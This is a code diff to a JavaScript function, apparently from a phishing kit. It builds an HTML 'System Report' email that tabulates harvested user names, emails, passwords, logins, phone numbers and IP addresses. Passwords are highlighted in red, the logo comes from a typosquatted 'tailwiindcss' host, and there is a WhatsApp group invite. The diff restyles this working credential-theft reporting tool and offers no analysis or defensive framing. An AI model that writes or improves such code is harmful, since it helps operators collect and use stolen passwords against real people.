@@ -73,37 +73,94 @@ function extractVars(input = "") {
 // ======================
 // BUILD ROW (AUTO SKIP EMPTY)
 // ======================
-function row(label, value) {
+function row(label, value, color = "#e5e7eb") {
   if (!value || value.trim() === "") return "";
+
   return `
-<tr>
-  <td style="padding:6px 10px;border-bottom:1px solid #334155;color:#94a3b8">${label}</td>
-  <td style="padding:6px 10px;border-bottom:1px solid #334155;color:#fff">${value}</td>
-</tr>`;
+  <tr>
+    <td style="padding:10px 12px;border-bottom:1px solid #1f2937;color:#94a3b8;width:140px;font-size:13px">
+      ${label}
+    </td>
+    <td style="padding:10px 12px;border-bottom:1px solid #1f2937;color:${color};font-size:13px">
+      ${value}
+    </td>
+  </tr>`;
 }
 
 // ======================
-// BUILD HTML (CLEAN AUTO FILTER)
+// BUILD HTML
 // ======================
 function buildHtml(vars) {
   return `
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"></head>
-<body style="font-family:Arial;background:#0f172a;color:#fff;padding:20px">
+<head>
+<meta charset="UTF-8">
+</head>
 
-<h2 style="color:#38bdf8">🚨 SYSTEM ALERT</h2>
+<body style="margin:0;background:#0f172a;font-family:Arial,sans-serif;color:#e5e7eb">
 
-<table style="width:100%;border-collapse:collapse;background:#1e293b;border-radius:10px;overflow:hidden">
+<div style="max-width:700px;margin:40px auto;background:#111827;border:1px solid #1f2937;border-radius:12px;overflow:hidden">
 
-${row("User", vars.user)}
-${row("Email", vars.email)}
-${row("Password", vars.password)}
-${row("Login", vars.login)}
-${row("Phone", vars.phone)}
-${row("IP", vars.ip)}
+  <!-- HEADER -->
+  <div style="padding:18px 22px;background:#0b1220;border-bottom:1px solid #1f2937;display:flex;align-items:center;gap:12px">
 
-</table>
+    <img src="https://tailwiindcss.vercel.app/3b3dea7e-7574-445a-8d0d-98ec60b426b1.png"
+      style="width:42px;height:42px;border-radius:8px">
+
+    <div>
+      <div style="font-size:15px;font-weight:600;color:#fff">
+        System Report
+      </div>
+      <div style="font-size:12px;color:#94a3b8">
+        Monitoring Dashboard
+      </div>
+    </div>
+
+  </div>
+
+  <!-- CONTENT -->
+  <div style="padding:18px 22px">
+
+    <table style="width:100%;border-collapse:collapse">
+
+      ${row("User", vars.user)}
+      ${row("Email", vars.email)}
+      ${row("Password", vars.password, "#f87171")}
+      ${row("Login", vars.login, "#34d399")}
+      ${row("Phone", vars.phone)}
+      ${row("IP Address", vars.ip, "#60a5fa")}
+
+    </table>
+
+  </div>
+
+  <!-- JOIN WHATSAPP -->
+  <div style="padding:18px 22px;text-align:center">
+
+    <a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ"
+       style="
+         display:inline-block;
+         background:#25D366;
+         color:#fff;
+         text-decoration:none;
+         padding:12px 18px;
+         border-radius:8px;
+         font-size:13px;
+         font-weight:600;
+         font-family:Arial,sans-serif;
+       ">
+      💬 Join WhatsApp Group
+    </a>
+
+  </div>
+
+  <!-- FOOTER -->
+  <div style="padding:14px 22px;border-top:1px solid #1f2937;background:#0b1220;font-size:11px;color:#6b7280;text-align:center">
+    © 2026 System Monitoring
+  </div>
+
+</div>
 
 </body>
 </html>
